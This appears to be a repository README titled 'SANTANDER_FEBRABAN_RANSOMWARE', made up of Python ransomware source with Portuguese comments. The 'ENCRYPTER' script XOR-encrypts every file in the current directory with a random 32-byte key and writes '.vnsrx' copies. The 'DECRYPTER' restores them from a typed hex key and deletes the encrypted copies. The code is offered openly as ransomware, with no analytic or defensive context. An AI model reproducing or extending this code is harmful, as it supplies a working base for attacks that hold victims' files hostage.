# SANTANDER_FEBRABAN_RANSOMWARE

ENCRYPTER
import os
import random

def generate_random_key(length):
    """Gera uma chave aleatória de bytes."""
    return os.urandom(length)

def encrypt_file(file_name, key):
    """Criptografa o arquivo especificado usando a chave fornecida."""
    try:
        with open(file_name, 'rb') as f:
            data = f.read()
        encrypted_data = bytearray(data)
        for i in range(len(encrypted_data)):
            encrypted_data[i] ^= key[i % len(key)]
        with open(file_name + '.vnsrx', 'wb') as f:
            f.write(encrypted_data)
    except PermissionError:
        print(f"Permissão negada: {file_name}")
    except Exception as e:
        print(f"Erro ao criptografar {file_name}: {e}")

def main():
    # Gera uma chave aleatória de 32 bytes
    key = generate_random_key(32)

    print(f"Chave gerada: {key.hex()}")  # Exibe a chave em formato hexadecimal

    # Nome do arquivo do script
    script_name = os.path.basename(__file__)

    # Lista todos os arquivos no diretório atual
    for file_name in os.listdir('.'):
        # Ignora diretórios, arquivos já criptografados e o próprio script
        if os.path.isfile(file_name) and not file_name.endswith('.vnsrx') and file_name != script_name:
            encrypt_file(file_name, key)

    print("Todos os arquivos foram criptografados.")

if __name__ == "__main__":
    main()


DECRYPTER
import os

def decrypt_file(file_name, key):
    """Descriptografa o arquivo especificado usando a chave fornecida."""
    try:
        with open(file_name, 'rb') as f:
            encrypted_data = f.read()
        decrypted_data = bytearray(encrypted_data)
        for i in range(len(decrypted_data)):
            decrypted_data[i] ^= key[i % len(key)]
        new_file_name = file_name.replace('.vnsrx', '')
        with open(new_file_name, 'wb') as f:
            f.write(decrypted_data)
        # Verifica se o arquivo descriptografado foi criado com sucesso
        if os.path.isfile(new_file_name):
            # Remove o arquivo criptografado
            os.remove(file_name)
            print(f"Arquivo criptografado {file_name} foi removido.")
        else:
            print(f"Erro: O arquivo descriptografado {new_file_name} não foi criado. O arquivo criptografado não será removido.")
    except PermissionError:
        print(f"Permissão negada: {file_name}")
    except Exception as e:
        print(f"Erro ao descriptografar {file_name}: {e}")

def main():
    # Solicita ao usuário que insira a chave de descriptografia em formato hexadecimal
    key_hex = input("Digite a chave de descriptografia em formato hexadecimal (64 caracteres): ").strip()

    # Verifica se a chave tem exatamente 64 caracteres (32 bytes em hexadecimal)
    if len(key_hex) != 64:
        print("A chave deve ter exatamente 64 caracteres em formato hexadecimal.")
        return

    # Converte a chave de hexadecimal para bytes
    key = bytes.fromhex(key_hex)

    # Lista todos os arquivos no diretório atual
    for file_name in os.listdir('.'):
        # Verifica se o arquivo é criptografado
        if os.path.isfile(file_name) and file_name.endswith('.vnsrx'):
            decrypt_file(file_name, key)

    print("Todos os arquivos criptografados foram descriptografados e removidos.")

if __name__ == "__main__":
    main()




    
